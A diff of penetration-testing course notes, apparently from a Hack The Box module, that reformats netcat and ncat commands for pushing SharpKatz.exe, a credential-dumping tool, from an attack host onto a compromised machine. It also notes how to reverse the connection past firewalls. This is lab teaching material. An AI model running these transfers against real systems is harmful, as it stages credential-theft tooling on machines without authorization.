@@ -408,23 +408,24 @@ You can't access this shared folder because your organization's security policie
 - The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
 - **Steps**
     1. We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename:
-```bash
 
-    victim@target:~$ # Example using Original Netcat
-    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+    ```bash
+        victim@target:~$ # Example using Original Netcat
+        victim@target:~$ nc -l -p 8000 > SharpKatz.exe
 
-    victim@target:~$ # Example using Ncat
-    victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
-```
+        victim@target:~$ # Example using Ncat
+        victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+    ```
 
     2. From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat.
-```bash
-    abdeonix@htb[/htb]$ # Example using Original Netcat
-    abdeonix@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 
-    abdeonix@htb[/htb]$ # Example using Ncat
-    abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
-```
+    ```bash
+        abdeonix@htb[/htb]$ # Example using Original Netcat
+        abdeonix@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+
+        abdeonix@htb[/htb]$ # Example using Ncat
+        abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+    ```
 
 > [!NOTE]
 > Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
